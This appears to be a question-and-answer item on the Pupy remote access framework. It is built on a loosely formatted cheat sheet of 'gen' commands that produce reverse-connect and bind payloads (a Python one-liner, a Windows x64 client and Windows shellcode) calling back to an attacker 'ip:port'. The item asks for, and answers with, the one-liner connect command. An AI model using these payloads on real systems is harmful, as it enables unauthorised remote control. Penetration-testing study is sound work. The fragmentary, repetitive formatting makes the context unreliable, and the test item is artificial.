Context:```
>> gen -f py bind --port port -t transport
```
### Python One-liner Connect Payload with pupy
Creates a Python one-liner payload that connects back to the attacker machine at the specified IP and port using the chosen transport.

```
>> gen -f py_oneliner connect --host ip:port -t transport
```
```
>> gen -f client -O windows -A x64 connect --host ip:port -t transport
```
### Python Bind Payload with pupy
Generates a **Python payload** that opens a listener on the target machine, binding to a specific port with the specified transport method.
```
>> gen -f py bind --port port -t transport
```
>> gen -f <format> <launcher> -t <transport>
```
### Windows Shellcode Payload with pupy
Generates a Windows shellcode payload that connects to the specified IP and port using a transport method.
```
>> gen -S -f client -O windows -A x64 connect --host ip:port -t transport

 Question: Generate an example of using the gen command in Pupy to create a Python one-liner connect payload. The payload should connect back to the attacker machine at the specified IP and port using the chosen transport method. Respond with the command in the following format: \n >> gen -f py_oneliner connect --host ip:port -t <transport>. 

 Your response: 
```
>> gen -f py_oneliner connect --host ip:port -t transport
```